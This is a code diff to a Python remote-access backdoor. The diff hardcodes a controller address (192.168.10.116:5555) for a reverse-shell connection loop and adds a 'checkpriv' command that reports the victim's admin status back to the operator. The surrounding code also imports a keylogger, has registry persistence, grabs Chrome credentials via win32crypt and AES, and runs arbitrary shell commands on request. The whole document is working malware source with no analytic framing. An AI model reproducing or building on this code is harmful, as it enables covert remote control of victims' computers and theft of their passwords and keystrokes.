@@ -2,7 +2,7 @@ import socket
 import json
 import subprocess
 import time
-import os
+import ctypes, os
 import pyautogui
 import keylogger
 import threading
@@ -13,6 +13,7 @@ import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
 from datetime import datetime, timedelta
+
 
 
 def reliable_send(data):
@@ -72,12 +73,23 @@ def persist(reg_name, copy_name):
 def connection():
     while True:
         try:
-            s.connect(('ip address', 5555))
+            time.sleep(5)
+            s.connect(('192.168.10.116', 5555))
             shell()
             s.close()
             break
         except:
             connection()
+
+def check():
+    try:
+        is_admin = os.getuid() == 0
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin == True:
+        reliable_send("Have admin privilege!!!")
+    else:
+        reliable_send("No admin privilege")
 
 
 def get_chrome_datetime(chromedate):
@@ -192,6 +204,8 @@ def shell():
             persist(reg_name, copy_name)
         elif command[:10] == "chromegrab":
             chrome()
+        elif command[:9] == "checkpriv":
+            check()
         elif command[:7] == 'sendall':
             subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
         else:
